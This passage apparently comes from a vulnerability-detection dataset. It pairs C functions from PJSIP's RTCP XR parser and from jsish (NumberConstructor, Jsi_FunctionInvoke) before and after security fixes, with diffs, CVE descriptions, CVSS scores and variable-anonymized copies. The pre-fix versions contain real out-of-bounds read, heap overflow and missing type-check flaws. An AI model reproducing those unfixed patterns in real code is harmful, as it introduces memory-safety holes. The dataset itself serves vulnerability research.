    const pjmedia_rtcp_xr_rb_stats    *rb_stats = NULL;
    const pjmedia_rtcp_xr_rb_voip_mtc *rb_voip_mtc = NULL;
    const pjmedia_rtcp_xr_rb_header   *rb_hdr = (pjmedia_rtcp_xr_rb_header*) 
						rtcp_xr->buf;
    unsigned pkt_len, rb_len;

    if (rtcp_xr->common.pt != RTCP_XR)
	return;

    pkt_len = pj_ntohs((pj_uint16_t)rtcp_xr->common.length);

    if ((pkt_len + 1) > (size / 4))
	return;

    /* Parse report rpt_types */
    while ((pj_int32_t*)rb_hdr < (pj_int32_t*)pkt + pkt_len)
    {	
	rb_len = pj_ntohs((pj_uint16_t)rb_hdr->length);

	/* Just skip any block with length == 0 (no report content) */
	if (rb_len) {
	    switch (rb_hdr->bt) {
		case BT_RR_TIME:
		    if ((char*)rb_hdr + sizeof(*rb_rr_time) <=
			(char*)pkt + size) 
		    {
			rb_rr_time = (pjmedia_rtcp_xr_rb_rr_time*)rb_hdr;
		    }
		    break;
		case BT_DLRR:
		    if ((char*)rb_hdr + sizeof(*rb_dlrr) <=
			(char*)pkt + size)
		    {
			rb_dlrr = (pjmedia_rtcp_xr_rb_dlrr*)rb_hdr;
		    }
		    break;
		case BT_STATS:
		    if ((char*)rb_hdr + sizeof(*rb_stats) <=
			(char*)pkt + size)
		    {
			rb_stats = (pjmedia_rtcp_xr_rb_stats*)rb_hdr;
		    }
		    break;
		case BT_VOIP_METRICS:
		    if ((char*)rb_hdr + sizeof(*rb_voip_mtc) <=
			(char*)pkt + size)
		    {
			rb_voip_mtc = (pjmedia_rtcp_xr_rb_voip_mtc*)rb_hdr;
		    }
		    break;
		default:
		    break;
	    }
	}
	rb_hdr = (pjmedia_rtcp_xr_rb_header*)
		 ((pj_int32_t*)rb_hdr + rb_len + 1);
    }

    /* Receiving RR Time */
    if (rb_rr_time) {
	/* Save LRR from NTP timestamp of the RR time block report */
	sess->rx_lrr = ((pj_ntohl(rb_rr_time->ntp_sec) & 0x0000FFFF) << 16) | 
		       ((pj_ntohl(rb_rr_time->ntp_frac) >> 16) & 0xFFFF);

	/* Calculate RR arrival time for DLRR */
	pj_get_timestamp(&sess->rx_lrr_time);

	TRACE_((sess->name, ""Rx RTCP SR: ntp_ts=%p"", sess->rx_lrr,
	       (pj_uint32_t)(sess->rx_lrr_time.u64*65536/
			     sess->rtcp_session->ts_freq.u64)));
    }

    /* Receiving DLRR */
    if (rb_dlrr) {
	pj_uint32_t lrr, now, dlrr;
	pj_uint64_t eedelay;
	pjmedia_rtcp_ntp_rec ntp;

	/* LRR is the middle 32bit of NTP. It has 1/65536 second 
	 * resolution 
	 */
	lrr = pj_ntohl(rb_dlrr->item.lrr);

	/* DLRR is delay since LRR, also in 1/65536 resolution */
	dlrr = pj_ntohl(rb_dlrr->item.dlrr);

	/* Get current time, and convert to 1/65536 resolution */
	pjmedia_rtcp_get_ntp_time(sess->rtcp_session, &ntp);
	now = ((ntp.hi & 0xFFFF) << 16) + (ntp.lo >> 16);

	/* End-to-end delay is (now-lrr-dlrr) */
	eedelay = now - lrr - dlrr;

	/* Convert end to end delay to usec (keeping the calculation in
         * 64bit space)::
	 *   sess->ee_delay = (eedelay * 1000) / 65536;
	 */
	if (eedelay < 4294) {
	    eedelay = (eedelay * 1000000) >> 16;
	} else {
	    eedelay = (eedelay * 1000) >> 16;
	    eedelay *= 1000;
	}

	TRACE_((sess->name, ""Rx RTCP XR DLRR: lrr=%p, dlrr=%p (%d:%03dms), ""
			   ""now=%p, rtt=%p"",
		lrr, dlrr, dlrr/65536, (dlrr%65536)*1000/65536,
		now, (pj_uint32_t)eedelay));
	
	/* Only save calculation if ""now"" is greater than lrr, or
	 * otherwise rtt will be invalid 
	 */
	if (now-dlrr >= lrr) {
	    unsigned rtt = (pj_uint32_t)eedelay;
	    
	    /* Check that eedelay value really makes sense. 
	     * We allow up to 30 seconds RTT!
	     */
	    if (eedelay <= 30 * 1000 * 1000UL) {
		/* ""Normalize"" rtt value that is exceptionally high.
		 * For such values, ""normalize"" the rtt to be three times
		 * the average value.
		 */
		if (rtt>((unsigned)sess->stat.rtt.mean*3) && sess->stat.rtt.n!=0)
		{
		    unsigned orig_rtt = rtt;
		    rtt = (unsigned)sess->stat.rtt.mean*3;
		    PJ_LOG(5,(sess->name, 
			      ""RTT value %d usec is normalized to %d usec"",
			      orig_rtt, rtt));
		}
    	
		TRACE_((sess->name, ""RTCP RTT is set to %d usec"", rtt));
		pj_math_stat_update(&sess->stat.rtt, rtt);
	    }
	} else {
	    PJ_LOG(5, (sess->name, ""Internal RTCP NTP clock skew detected: ""
				   ""lrr=%p, now=%p, dlrr=%p (%d:%03dms), ""
				   ""diff=%d"",
				   lrr, now, dlrr, dlrr/65536,
				   (dlrr%65536)*1000/65536,
				   dlrr-(now-lrr)));
	}
    }

    /* Receiving Statistics Summary */
    if (rb_stats) {
	pj_uint8_t flags = rb_stats->header.specific;

	pj_bzero(&sess->stat.tx.stat_sum, sizeof(sess->stat.tx.stat_sum));

	/* Range of packets sequence reported in this blocks */
	sess->stat.tx.stat_sum.begin_seq = pj_ntohs(rb_stats->begin_seq);
	sess->stat.tx.stat_sum.end_seq   = pj_ntohs(rb_stats->end_seq);

	/* Get flags of valid fields */
	sess->stat.tx.stat_sum.l = (flags & (1 << 7)) != 0;
	sess->stat.tx.stat_sum.d = (flags & (1 << 6)) != 0;
	sess->stat.tx.stat_sum.j = (flags & (1 << 5)) != 0;
	sess->stat.tx.stat_sum.t = (flags & (3 << 3)) != 0;

	/* Fetch the reports info */
	if (sess->stat.tx.stat_sum.l) {
	    sess->stat.tx.stat_sum.lost = pj_ntohl(rb_stats->lost);
	}

	if (sess->stat.tx.stat_sum.d) {
	    sess->stat.tx.stat_sum.dup = pj_ntohl(rb_stats->dup);
	}

	if (sess->stat.tx.stat_sum.j) {
	    sess->stat.tx.stat_sum.jitter.min = pj_ntohl(rb_stats->jitter_min);
	    sess->stat.tx.stat_sum.jitter.max = pj_ntohl(rb_stats->jitter_max);
	    sess->stat.tx.stat_sum.jitter.mean= pj_ntohl(rb_stats->jitter_mean);
	    pj_math_stat_set_stddev(&sess->stat.tx.stat_sum.jitter, 
				    pj_ntohl(rb_stats->jitter_dev));
	}

	if (sess->stat.tx.stat_sum.t) {
	    sess->stat.tx.stat_sum.toh.min = rb_stats->toh_min;
	    sess->stat.tx.stat_sum.toh.max = rb_stats->toh_max;
	    sess->stat.tx.stat_sum.toh.mean= rb_stats->toh_mean;
	    pj_math_stat_set_stddev(&sess->stat.tx.stat_sum.toh, 
				    pj_ntohl(rb_stats->toh_dev));
	}

	pj_gettimeofday(&sess->stat.tx.stat_sum.update);
    }

    /* Receiving VoIP Metrics */
    if (rb_voip_mtc) {
	sess->stat.tx.voip_mtc.loss_rate = rb_voip_mtc->loss_rate;
	sess->stat.tx.voip_mtc.discard_rate = rb_voip_mtc->discard_rate;
	sess->stat.tx.voip_mtc.burst_den = rb_voip_mtc->burst_den;
	sess->stat.tx.voip_mtc.gap_den = rb_voip_mtc->gap_den;
	sess->stat.tx.voip_mtc.burst_dur = pj_ntohs(rb_voip_mtc->burst_dur);
	sess->stat.tx.voip_mtc.gap_dur = pj_ntohs(rb_voip_mtc->gap_dur);
	sess->stat.tx.voip_mtc.rnd_trip_delay = 
					pj_ntohs(rb_voip_mtc->rnd_trip_delay);
	sess->stat.tx.voip_mtc.end_sys_delay = 
					pj_ntohs(rb_voip_mtc->end_sys_delay);
	/* signal & noise level encoded in two's complement form */
	sess->stat.tx.voip_mtc.signal_lvl = (pj_int8_t)
				    ((rb_voip_mtc->signal_lvl > 127)?
				     ((int)rb_voip_mtc->signal_lvl - 256) : 
				     rb_voip_mtc->signal_lvl);
	sess->stat.tx.voip_mtc.noise_lvl  = (pj_int8_t)
				    ((rb_voip_mtc->noise_lvl > 127)?
				     ((int)rb_voip_mtc->noise_lvl - 256) : 
				     rb_voip_mtc->noise_lvl);
	sess->stat.tx.voip_mtc.rerl = rb_voip_mtc->rerl;
	sess->stat.tx.voip_mtc.gmin = rb_voip_mtc->gmin;
	sess->stat.tx.voip_mtc.r_factor = rb_voip_mtc->r_factor;
	sess->stat.tx.voip_mtc.ext_r_factor = rb_voip_mtc->ext_r_factor;
	sess->stat.tx.voip_mtc.mos_lq = rb_voip_mtc->mos_lq;
	sess->stat.tx.voip_mtc.mos_cq = rb_voip_mtc->mos_cq;
	sess->stat.tx.voip_mtc.rx_config = rb_voip_mtc->rx_config;
	sess->stat.tx.voip_mtc.jb_nom = pj_ntohs(rb_voip_mtc->jb_nom);
	sess->stat.tx.voip_mtc.jb_max = pj_ntohs(rb_voip_mtc->jb_max);
	sess->stat.tx.voip_mtc.jb_abs_max = pj_ntohs(rb_voip_mtc->jb_abs_max);

	pj_gettimeofday(&sess->stat.tx.voip_mtc.update);
    }
}","void pjmedia_rtcp_xr_rx_rtcp_xr( pjmedia_rtcp_xr_session *VAR_0,
				 const void *VAR_1,
				 pj_size_t VAR_2)
{
    const pjmedia_rtcp_xr_pkt	      *VAR_3 = (pjmedia_rtcp_xr_pkt*) VAR_1;
    const pjmedia_rtcp_xr_rb_rr_time  *VAR_4 = NULL;
    const pjmedia_rtcp_xr_rb_dlrr     *VAR_5 = NULL;
    const pjmedia_rtcp_xr_rb_stats    *VAR_6 = NULL;
    const pjmedia_rtcp_xr_rb_voip_mtc *VAR_7 = NULL;
    const pjmedia_rtcp_xr_rb_header   *VAR_8 = (pjmedia_rtcp_xr_rb_header*) 
						VAR_3->buf;
    unsigned VAR_9, VAR_10;

    if (VAR_3->common.pt != VAR_11)
	return;

    VAR_9 = pj_ntohs((pj_uint16_t)VAR_3->common.length);

    if ((VAR_9 + 1) > (VAR_2 / 4))
	return;

    /* COMMENT_0 */
    while ((pj_int32_t*)VAR_8 < (pj_int32_t*)VAR_1 + VAR_9)
    {	
	VAR_10 = pj_ntohs((pj_uint16_t)VAR_8->length);

	/* COMMENT_1 */
	if (VAR_10) {
	    switch (VAR_8->bt) {
		case VAR_12:
		    if ((char*)VAR_8 + sizeof(*VAR_4) <=
			(char*)VAR_1 + VAR_2) 
		    {
			VAR_4 = (pjmedia_rtcp_xr_rb_rr_time*)VAR_8;
		    }
		    break;
		case VAR_13:
		    if ((char*)VAR_8 + sizeof(*VAR_5) <=
			(char*)VAR_1 + VAR_2)
		    {
			VAR_5 = (pjmedia_rtcp_xr_rb_dlrr*)VAR_8;
		    }
		    break;
		case VAR_14:
		    if ((char*)VAR_8 + sizeof(*VAR_6) <=
			(char*)VAR_1 + VAR_2)
		    {
			VAR_6 = (pjmedia_rtcp_xr_rb_stats*)VAR_8;
		    }
		    break;
		case VAR_15:
		    if ((char*)VAR_8 + sizeof(*VAR_7) <=
			(char*)VAR_1 + VAR_2)
		    {
			VAR_7 = (pjmedia_rtcp_xr_rb_voip_mtc*)VAR_8;
		    }
		    break;
		default:
		    break;
	    }
	}
	VAR_8 = (pjmedia_rtcp_xr_rb_header*)
		 ((pj_int32_t*)VAR_8 + VAR_10 + 1);
    }

    /* COMMENT_2 */
    if (VAR_4) {
	/* COMMENT_3 */
	VAR_0->rx_lrr = ((pj_ntohl(VAR_4->ntp_sec) & 0x0000FFFF) << 16) | 
		       ((pj_ntohl(VAR_4->ntp_frac) >> 16) & 0xFFFF);

	/* COMMENT_4 */
	pj_get_timestamp(&VAR_0->rx_lrr_time);

	TRACE_((VAR_0->name, ""Rx RTCP SR: ntp_ts=%p"", VAR_0->rx_lrr,
	       (VAR_16)(VAR_0->rx_lrr_time.u64*65536/
			     VAR_0->rtcp_session->ts_freq.u64)));
    }

    /* COMMENT_5 */
    if (VAR_5) {
	pj_uint32_t VAR_17, VAR_18, VAR_19;
	pj_uint64_t VAR_20;
	pjmedia_rtcp_ntp_rec VAR_21;

	/* COMMENT_6 */
               
    
	VAR_17 = pj_ntohl(VAR_5->item.lrr);

	/* COMMENT_9 */
	VAR_19 = pj_ntohl(VAR_5->item.dlrr);

	/* COMMENT_10 */
	pjmedia_rtcp_get_ntp_time(VAR_0->rtcp_session, &VAR_21);
	VAR_18 = ((VAR_21.hi & 0xFFFF) << 16) + (VAR_21.lo >> 16);

	/* COMMENT_11 */
	VAR_20 = VAR_18 - VAR_17 - VAR_19;

	/* COMMENT_12 */
                         
                                                
    
	if (VAR_20 < 4294) {
	    VAR_20 = (VAR_20 * 1000000) >> 16;
	} else {
	    VAR_20 = (VAR_20 * 1000) >> 16;
	    VAR_20 *= 1000;
	}

	TRACE_((VAR_0->name, ""Rx RTCP XR DLRR: lrr=%p, dlrr=%p (%d:%03dms), ""
			   ""now=%p, rtt=%p"",
		VAR_17, VAR_19, VAR_19/65536, (VAR_19%65536)*1000/65536,
		VAR_18, (pj_uint32_t)VAR_20));
	
	/* COMMENT_16 */
                                  
    
	if (VAR_18-VAR_19 >= VAR_17) {
	    unsigned VAR_22 = (pj_uint32_t)VAR_20;
	    
	    /* COMMENT_19 */
                                      
        
	    if (VAR_20 <= 30 * 1000 * 1000UL) {
		/* COMMENT_22 */
                                                           
                       
     
		if (VAR_22>((unsigned)VAR_0->stat.rtt.mean*3) && VAR_0->stat.rtt.n!=0)
		{
		    unsigned VAR_23 = VAR_22;
		    VAR_22 = (unsigned)VAR_0->stat.rtt.mean*3;
		    PJ_LOG(5,(VAR_0->name, 
			      ""RTT value %d usec is normalized to %d usec"",
			      VAR_23, VAR_22));
		}
    	
		TRACE_((VAR_0->name, ""RTCP RTT is set to %d usec"", VAR_22));
		pj_math_stat_update(&VAR_0->stat.rtt, VAR_22);
	    }
	} else {
	    PJ_LOG(5, (VAR_0->name, ""Internal RTCP NTP clock skew detected: ""
				   ""lrr=%p, now=%p, dlrr=%p (%d:%03dms), ""
				   ""diff=%d"",
				   VAR_17, VAR_18, VAR_19, VAR_19/65536,
				   (VAR_19%65536)*1000/65536,
				   VAR_19-(VAR_18-VAR_17)));
	}
    }

    /* COMMENT_26 */
    if (VAR_6) {
	pj_uint8_t VAR_24 = VAR_6->header.specific;

	pj_bzero(&VAR_0->stat.tx.stat_sum, sizeof(VAR_0->stat.tx.stat_sum));

	/* COMMENT_27 */
	VAR_0->stat.tx.stat_sum.begin_seq = pj_ntohs(VAR_6->begin_seq);
	VAR_0->stat.tx.stat_sum.end_seq   = pj_ntohs(VAR_6->end_seq);

	/* COMMENT_28 */
	VAR_0->stat.tx.stat_sum.l = (VAR_24 & (1 << 7)) != 0;
	VAR_0->stat.tx.stat_sum.d = (VAR_24 & (1 << 6)) != 0;
	VAR_0->stat.tx.stat_sum.j = (VAR_24 & (1 << 5)) != 0;
	VAR_0->stat.tx.stat_sum.t = (VAR_24 & (3 << 3)) != 0;

	/* COMMENT_29 */
	if (VAR_0->stat.tx.stat_sum.l) {
	    VAR_0->stat.tx.stat_sum.lost = pj_ntohl(VAR_6->lost);
	}

	if (VAR_0->stat.tx.stat_sum.d) {
	    VAR_0->stat.tx.stat_sum.dup = pj_ntohl(VAR_6->dup);
	}

	if (VAR_0->stat.tx.stat_sum.j) {
	    VAR_0->stat.tx.stat_sum.jitter.min = pj_ntohl(VAR_6->jitter_min);
	    VAR_0->stat.tx.stat_sum.jitter.max = pj_ntohl(VAR_6->jitter_max);
	    VAR_0->stat.tx.stat_sum.jitter.mean= pj_ntohl(VAR_6->jitter_mean);
	    pj_math_stat_set_stddev(&VAR_0->stat.tx.stat_sum.jitter, 
				    pj_ntohl(VAR_6->jitter_dev));
	}

	if (VAR_0->stat.tx.stat_sum.t) {
	    VAR_0->stat.tx.stat_sum.toh.min = VAR_6->toh_min;
	    VAR_0->stat.tx.stat_sum.toh.max = VAR_6->toh_max;
	    VAR_0->stat.tx.stat_sum.toh.mean= VAR_6->toh_mean;
	    pj_math_stat_set_stddev(&VAR_0->stat.tx.stat_sum.toh, 
				    pj_ntohl(VAR_6->toh_dev));
	}

	pj_gettimeofday(&VAR_0->stat.tx.stat_sum.update);
    }

    /* COMMENT_30 */
    if (VAR_7) {
	VAR_0->stat.tx.voip_mtc.loss_rate = VAR_7->loss_rate;
	VAR_0->stat.tx.voip_mtc.discard_rate = VAR_7->discard_rate;
	VAR_0->stat.tx.voip_mtc.burst_den = VAR_7->burst_den;
	VAR_0->stat.tx.voip_mtc.gap_den = VAR_7->gap_den;
	VAR_0->stat.tx.voip_mtc.burst_dur = pj_ntohs(VAR_7->burst_dur);
	VAR_0->stat.tx.voip_mtc.gap_dur = pj_ntohs(VAR_7->gap_dur);
	VAR_0->stat.tx.voip_mtc.rnd_trip_delay = 
					pj_ntohs(VAR_7->rnd_trip_delay);
	VAR_0->stat.tx.voip_mtc.end_sys_delay = 
					pj_ntohs(VAR_7->end_sys_delay);
	/* COMMENT_31 */
	VAR_0->stat.tx.voip_mtc.signal_lvl = (VAR_25)
				    ((VAR_7->signal_lvl > 127)?
				     ((int)VAR_7->signal_lvl - 256) : 
				     VAR_7->signal_lvl);
	VAR_0->stat.tx.voip_mtc.noise_lvl  = (VAR_25)
				    ((VAR_7->noise_lvl > 127)?
				     ((int)VAR_7->noise_lvl - 256) : 
				     VAR_7->noise_lvl);
	VAR_0->stat.tx.voip_mtc.rerl = VAR_7->rerl;
	VAR_0->stat.tx.voip_mtc.gmin = VAR_7->gmin;
	VAR_0->stat.tx.voip_mtc.r_factor = VAR_7->r_factor;
	VAR_0->stat.tx.voip_mtc.ext_r_factor = VAR_7->ext_r_factor;
	VAR_0->stat.tx.voip_mtc.mos_lq = VAR_7->mos_lq;
	VAR_0->stat.tx.voip_mtc.mos_cq = VAR_7->mos_cq;
	VAR_0->stat.tx.voip_mtc.rx_config = VAR_7->rx_config;
	VAR_0->stat.tx.voip_mtc.jb_nom = pj_ntohs(VAR_7->jb_nom);
	VAR_0->stat.tx.voip_mtc.jb_max = pj_ntohs(VAR_7->jb_max);
	VAR_0->stat.tx.voip_mtc.jb_abs_max = pj_ntohs(VAR_7->jb_abs_max);

	pj_gettimeofday(&VAR_0->stat.tx.voip_mtc.update);
    }
}",pjsip/pjproject/f74c1fc22b760d2a24369aa72c74c4a9ab985859/rtcp_xr.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -28,16 +28,32 @@
 	if (rb_len) {
 	    switch (rb_hdr->bt) {
 		case BT_RR_TIME:
-		    rb_rr_time = (pjmedia_rtcp_xr_rb_rr_time*) rb_hdr;
+		    if ((char*)rb_hdr + sizeof(*rb_rr_time) <=
+			(char*)pkt + size) 
+		    {
+			rb_rr_time = (pjmedia_rtcp_xr_rb_rr_time*)rb_hdr;
+		    }
 		    break;
 		case BT_DLRR:
-		    rb_dlrr = (pjmedia_rtcp_xr_rb_dlrr*) rb_hdr;
+		    if ((char*)rb_hdr + sizeof(*rb_dlrr) <=
+			(char*)pkt + size)
+		    {
+			rb_dlrr = (pjmedia_rtcp_xr_rb_dlrr*)rb_hdr;
+		    }
 		    break;
 		case BT_STATS:
-		    rb_stats = (pjmedia_rtcp_xr_rb_stats*) rb_hdr;
+		    if ((char*)rb_hdr + sizeof(*rb_stats) <=
+			(char*)pkt + size)
+		    {
+			rb_stats = (pjmedia_rtcp_xr_rb_stats*)rb_hdr;
+		    }
 		    break;
 		case BT_VOIP_METRICS:
-		    rb_voip_mtc = (pjmedia_rtcp_xr_rb_voip_mtc*) rb_hdr;
+		    if ((char*)rb_hdr + sizeof(*rb_voip_mtc) <=
+			(char*)pkt + size)
+		    {
+			rb_voip_mtc = (pjmedia_rtcp_xr_rb_voip_mtc*)rb_hdr;
+		    }
 		    break;
 		default:
 		    break;","{'deleted_lines': ['\t\t    rb_rr_time = (pjmedia_rtcp_xr_rb_rr_time*) rb_hdr;', '\t\t    rb_dlrr = (pjmedia_rtcp_xr_rb_dlrr*) rb_hdr;', '\t\t    rb_stats = (pjmedia_rtcp_xr_rb_stats*) rb_hdr;', '\t\t    rb_voip_mtc = (pjmedia_rtcp_xr_rb_voip_mtc*) rb_hdr;'], 'added_lines': ['\t\t    if ((char*)rb_hdr + sizeof(*rb_rr_time) <=', '\t\t\t(char*)pkt + size) ', '\t\t    {', '\t\t\trb_rr_time = (pjmedia_rtcp_xr_rb_rr_time*)rb_hdr;', '\t\t    }', '\t\t    if ((char*)rb_hdr + sizeof(*rb_dlrr) <=', '\t\t\t(char*)pkt + size)', '\t\t    {', '\t\t\trb_dlrr = (pjmedia_rtcp_xr_rb_dlrr*)rb_hdr;', '\t\t    }', '\t\t    if ((char*)rb_hdr + sizeof(*rb_stats) <=', '\t\t\t(char*)pkt + size)', '\t\t    {', '\t\t\trb_stats = (pjmedia_rtcp_xr_rb_stats*)rb_hdr;', '\t\t    }', '\t\t    if ((char*)rb_hdr + sizeof(*rb_voip_mtc) <=', '\t\t\t(char*)pkt + size)', '\t\t    {', '\t\t\trb_voip_mtc = (pjmedia_rtcp_xr_rb_voip_mtc*)rb_hdr;', '\t\t    }']}",True,"PJSIP is a free and open source multimedia communication library. In version 2.11.1 and prior, if incoming RTCP XR message contain block, the data field is not checked against the received packet size, potentially resulting in an out-of-bound read access. This affects all users that use PJMEDIA and RTCP XR. A malicious actor can send a RTCP XR message with an invalid packet size.",8.2,HIGH,2,valid,2021-12-24T04:17:15Z,4
CVE-2021-46482,['CWE-787'],AV:N/AC:M/Au:N/C:P/I:P/A:P,0,pcmacdon/jsish,"Fix issue #66

FossilOrigin-Name: 1a56f37adc0f00cd3e9e467873c4578299d4ac474be20f2e2658a05da20c32bc",803e487fd193c0c898d6d5bf6ffecf32316fb1e5,https://github.com/pcmacdon/jsish/commit/803e487fd193c0c898d6d5bf6ffecf32316fb1e5,src/jsiNumber.c,NumberConstructor,"static Jsi_RC NumberConstructor(Jsi_Interp *interp, Jsi_Value *args, Jsi_Value *_this,
Jsi_Value **ret, Jsi_Func *funcPtr)
{
if (Jsi_FunctionIsConstructor(funcPtr)) {
Jsi_Number nv = 0.0;
Jsi_Value *v = Jsi_ValueArrayIndex(interp, args, 0);
if (v) {
Jsi_ValueToNumber(interp, v);
nv = v->d.num;
}
_this->d.obj->ot = JSI_OT_NUMBER;
_this->d.obj->d.num = nv;
Jsi_ValueToObject(interp, _this);
Jsi_ValueMakeNumber(interp, ret, nv);
return JSI_OK;
}
Jsi_Value *v = Jsi_ValueArrayIndex(interp, args, 0);
if (v) {
Jsi_ValueToNumber(interp, v);
Jsi_ValueDup2(interp, ret, v);
Jsi_ValueToObject(interp, *ret);
return JSI_OK;
}
Jsi_ValueMakeNumber(interp, ret, 0.0);
return JSI_OK;
}","static Jsi_RC NumberConstructor(Jsi_Interp *VAR_0, Jsi_Value *VAR_1, Jsi_Value *VAR_2,
Jsi_Value **VAR_3, Jsi_Func *VAR_4)
{
if (Jsi_FunctionIsConstructor(VAR_4)) {
Jsi_Number VAR_5 = 0.0;
Jsi_Value *VAR_6 = Jsi_ValueArrayIndex(VAR_0, VAR_1, 0);
if (VAR_6) {
Jsi_ValueToNumber(VAR_0, VAR_6);
VAR_5 = VAR_6->d.num;
}
VAR_2->d.obj->ot = VAR_7;
VAR_2->d.obj->d.num = VAR_5;
Jsi_ValueToObject(VAR_0, VAR_2);
Jsi_ValueMakeNumber(VAR_0, VAR_3, VAR_5);
return VAR_8;
}
Jsi_Value *VAR_6 = Jsi_ValueArrayIndex(VAR_0, VAR_1, 0);
if (VAR_6) {
Jsi_ValueToNumber(VAR_0, VAR_6);
Jsi_ValueDup2(VAR_0, VAR_3, VAR_6);
Jsi_ValueToObject(VAR_0, *VAR_3);
return VAR_8;
}
Jsi_ValueMakeNumber(VAR_0, VAR_3, 0.0);
return VAR_8;
}",pcmacdon/jsish/803e487fd193c0c898d6d5bf6ffecf32316fb1e5/jsiNumber.c/vul/before/0.json,"static Jsi_RC NumberConstructor(Jsi_Interp *interp, Jsi_Value *args, Jsi_Value *_this,
    Jsi_Value **ret, Jsi_Func *funcPtr)
{
    if (Jsi_FunctionIsConstructor(funcPtr)) {
        Jsi_Number nv = 0.0;
        Jsi_Value *v = Jsi_ValueArrayIndex(interp, args, 0);
        if (v) {
            Jsi_ValueToNumber(interp, v);
            nv = v->d.num;
        }
        Jsi_ValueToObject(interp, _this);
        _this->d.obj->ot = JSI_OT_NUMBER;
        _this->d.obj->d.num = nv;
        Jsi_ValueMakeNumber(interp, ret, nv);
        return JSI_OK;
    }
    Jsi_Value *v = Jsi_ValueArrayIndex(interp, args, 0);
    if (v) {
        Jsi_ValueToNumber(interp, v);
        Jsi_ValueDup2(interp, ret, v);
        Jsi_ValueToObject(interp, *ret);
        return JSI_OK;
    }
    Jsi_ValueMakeNumber(interp, ret, 0.0);
    return JSI_OK;
}","static Jsi_RC NumberConstructor(Jsi_Interp *VAR_0, Jsi_Value *VAR_1, Jsi_Value *VAR_2,
    Jsi_Value **VAR_3, Jsi_Func *VAR_4)
{
    if (Jsi_FunctionIsConstructor(VAR_4)) {
        Jsi_Number VAR_5 = 0.0;
        Jsi_Value *VAR_6 = Jsi_ValueArrayIndex(VAR_0, VAR_1, 0);
        if (VAR_6) {
            Jsi_ValueToNumber(VAR_0, VAR_6);
            VAR_5 = VAR_6->d.num;
        }
        Jsi_ValueToObject(VAR_0, VAR_2);
        VAR_2->d.obj->ot = VAR_7;
        VAR_2->d.obj->d.num = VAR_5;
        Jsi_ValueMakeNumber(VAR_0, VAR_3, VAR_5);
        return VAR_8;
    }
    Jsi_Value *VAR_6 = Jsi_ValueArrayIndex(VAR_0, VAR_1, 0);
    if (VAR_6) {
        Jsi_ValueToNumber(VAR_0, VAR_6);
        Jsi_ValueDup2(VAR_0, VAR_3, VAR_6);
        Jsi_ValueToObject(VAR_0, *VAR_3);
        return VAR_8;
    }
    Jsi_ValueMakeNumber(VAR_0, VAR_3, 0.0);
    return VAR_8;
}",pcmacdon/jsish/803e487fd193c0c898d6d5bf6ffecf32316fb1e5/jsiNumber.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -8,9 +8,9 @@
             Jsi_ValueToNumber(interp, v);
             nv = v->d.num;
         }
+        Jsi_ValueToObject(interp, _this);
         _this->d.obj->ot = JSI_OT_NUMBER;
         _this->d.obj->d.num = nv;
-        Jsi_ValueToObject(interp, _this);
         Jsi_ValueMakeNumber(interp, ret, nv);
         return JSI_OK;
     }","{'deleted_lines': ['        Jsi_ValueToObject(interp, _this);'], 'added_lines': ['        Jsi_ValueToObject(interp, _this);']}",True,Jsish v3.5.0 was discovered to contain a heap buffer overflow via NumberConstructor at src/jsiNumber.c.,7.8,HIGH,2,valid,2021-12-24T15:52:24Z,4
CVE-2021-46492,['CWE-Other'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,pcmacdon/jsish,"Fixes #71

FossilOrigin-Name: 791bfcf31c4fd054409521d6b307060e6c2ebaa4b7e53bbd528de2fbb70bc710",1b5cb44d25469a4e61b71d8a974d2753fc2525e1,https://github.com/pcmacdon/jsish/commit/1b5cb44d25469a4e61b71d8a974d2753fc2525e1,src/jsiFunc.c,Jsi_FunctionInvoke,"Jsi_RC Jsi_FunctionInvoke(Jsi_Interp *interp, Jsi_Value *func, Jsi_Value *args, Jsi_Value **ret, Jsi_Value *_this)
{
Jsi_Func *fstatic = func->d.obj->d.fobj->func;
jsi_OpCode *oldops = interp->curIp;
if (fstatic->opcodes)
interp->curIp = fstatic->opcodes->codes;
Jsi_RC rc = jsi_FunctionInvoke(interp, func, args, ret, _this);
interp->curIp = oldops;
if (Jsi_InterpGone(interp))
return JSI_ERROR;
return rc;
}","Jsi_RC Jsi_FunctionInvoke(Jsi_Interp *VAR_0, Jsi_Value *VAR_1, Jsi_Value *VAR_2, Jsi_Value **VAR_3, Jsi_Value *VAR_4)
{
Jsi_Func *VAR_5 = VAR_1->d.obj->d.fobj->func;
jsi_OpCode *VAR_6 = VAR_0->curIp;
if (VAR_5->opcodes)
VAR_0->curIp = VAR_5->opcodes->codes;
Jsi_RC VAR_7 = jsi_FunctionInvoke(VAR_0, VAR_1, VAR_2, VAR_3, VAR_4);
VAR_0->curIp = VAR_6;
if (Jsi_InterpGone(VAR_0))
return VAR_8;
return VAR_7;
}",pcmacdon/jsish/1b5cb44d25469a4e61b71d8a974d2753fc2525e1/jsiFunc.c/vul/before/0.json,"Jsi_RC Jsi_FunctionInvoke(Jsi_Interp *interp, Jsi_Value *func, Jsi_Value *args, Jsi_Value **ret, Jsi_Value *_this)
{
    // Arrange for error reporting to point to called function.
    if (!Jsi_ValueIsFunction(interp, func))
        return Jsi_LogError(""expected function"");
    Jsi_Func *fstatic = func->d.obj->d.fobj->func;
    jsi_OpCode *oldops = interp->curIp;
    if (fstatic->opcodes)
        interp->curIp = fstatic->opcodes->codes;
    Jsi_RC rc = jsi_FunctionInvoke(interp, func, args, ret, _this);
    interp->curIp = oldops;
    if (Jsi_InterpGone(interp))
        return JSI_ERROR;
    return rc;
}","Jsi_RC Jsi_FunctionInvoke(Jsi_Interp *VAR_0, Jsi_Value *VAR_1, Jsi_Value *VAR_2, Jsi_Value **VAR_3, Jsi_Value *VAR_4)
{
    /* COMMENT_0 */
    if (!Jsi_ValueIsFunction(VAR_0, VAR_1))
        return Jsi_LogError(""expected function"");
    Jsi_Func *VAR_5 = VAR_1->d.obj->d.fobj->func;
    jsi_OpCode *VAR_6 = VAR_0->curIp;
    if (VAR_5->opcodes)
        VAR_0->curIp = VAR_5->opcodes->codes;
    Jsi_RC VAR_7 = jsi_FunctionInvoke(VAR_0, VAR_1, VAR_2, VAR_3, VAR_4);
    VAR_0->curIp = VAR_6;
    if (Jsi_InterpGone(VAR_0))
        return VAR_8;
    return VAR_7;
}",pcmacdon/jsish/1b5cb44d25469a4e61b71d8a974d2753fc2525e1/jsiFunc.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,6 +1,8 @@
